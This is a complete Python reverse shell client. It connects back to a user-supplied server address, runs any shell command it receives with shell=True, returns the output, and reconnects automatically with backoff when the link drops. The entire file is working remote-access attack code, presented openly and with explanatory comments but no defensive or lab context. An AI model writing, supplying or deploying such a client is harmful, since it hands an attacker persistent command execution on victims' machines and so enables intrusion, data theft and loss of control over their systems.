#!/usr/bin/env python3
"""
Reverse Shell Client - Version with configurable IP address.
This script connects back to a remote server and executes shell commands received.
"""

import os
import sys
import time
import random
import socket
import struct
import subprocess

def get_valid_ip():
    """Asks the user to input a valid IP address for the server."""
    while True:
        ip = input("Enter the server IP address: ").strip()
        try:
            socket.inet_aton(ip)  # Checks if IP is valid using inet_aton
            return ip
        except socket.error:
            print(f"Error: {ip} is not a valid IP address. Try again.")

def get_valid_port():
    """Asks the user to input a valid server port (default: 8000)."""
    while True:
        port = input("Enter the server port (default 8000): ").strip()
        if not port:
            return 8000  # Return default port if user presses Enter
        try:
            port = int(port)
            if 1 <= port <= 65535:
                return port
            print("Port number must be between 1 and 65535")
        except ValueError:
            print("Please enter a valid number for the port")

def reliable_send(sock, data):
    """
    Sends data over the socket with a 4-byte length prefix.
    Ensures the receiver knows exactly how many bytes to expect.
    """
    if isinstance(data, str):
        data = data.encode()  # Convert string to bytes if necessary
    sock.sendall(struct.pack('>I', len(data)))  # Send data length (big-endian)
    sock.sendall(data)  # Send actual data

def reliable_recv(sock):
    """
    Receives data with a 4-byte length prefix.
    Returns None if the connection is lost.
    """
    raw_len = sock.recv(4)  # Read the first 4 bytes (data length)
    if not raw_len:
        return None
    data_len = struct.unpack('>I', raw_len)[0]  # Unpack length
    return sock.recv(data_len)  # Read the exact number of bytes

def execute_command(command):
    """
    Executes a shell command and returns its output.
    Supports 'cd' as a special case to change working directory.
    """
    try:
        if command.startswith('cd '):
            os.chdir(command[3:])  # Change current directory
            return b""  # Return empty response
        # Execute command and capture both stdout and stderr
        proc = subprocess.run(command, shell=True,
                              stdout=subprocess.PIPE,
                              stderr=subprocess.PIPE)
        return proc.stdout + proc.stderr  # Return combined output
    except Exception as e:
        return str(e).encode()  # Return error message

def connect_to_server(server_ip, server_port):
    """
    Tries to connect to the remote server.
    Automatically retries with exponential backoff if connection fails.
    """
    reconnect_delay = 5   # Initial retry delay (seconds)
    max_delay = 60        # Maximum retry delay
    
    while True:
        try:
            print(f"\n[*] Trying to connect to {server_ip}:{server_port}...")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((server_ip, server_port))  # Attempt connection
            print("[+] Connection established! Awaiting commands...")
            return sock  # Return the connected socket
        except (socket.error, ConnectionRefusedError) as e:
            print(f"[!] Connection failed: {str(e)}")
            print(f"[*] Retrying in {reconnect_delay} seconds...")
            time.sleep(reconnect_delay)
            # Increase delay for next retry, capped at max_delay
            reconnect_delay = min(reconnect_delay * 2, max_delay)
        except KeyboardInterrupt:
            print("\n[!] Keyboard interruption. Exiting.")
            sys.exit(0)

def main():
    """Main function: gets config, connects, listens for and executes commands."""
    print("\n=== Reverse Shell Client ===")
    
    # Prompt the user for IP and port
    server_ip = get_valid_ip()
    server_port = get_valid_port()
    
    while True:
        try:
            # Try to establish a connection to the server
            sock = connect_to_server(server_ip, server_port)
            
            # Main loop: receive commands and send back output
            while True:
                command = reliable_recv(sock)
                if not command or command.decode().lower() == 'exit':
                    break  # Exit command or lost connection

                output = execute_command(command.decode())  # Execute received command
                reliable_send(sock, output)  # Send back the result

            sock.close()
            print("[!] Connection closed by server. Reconnecting...")
        
        except Exception as e:
            print(f"[!] Critical error: {str(e)}")
            time.sleep(5)  # Wait before retrying

# Entry point check
if __name__ == "__main__":
    main()
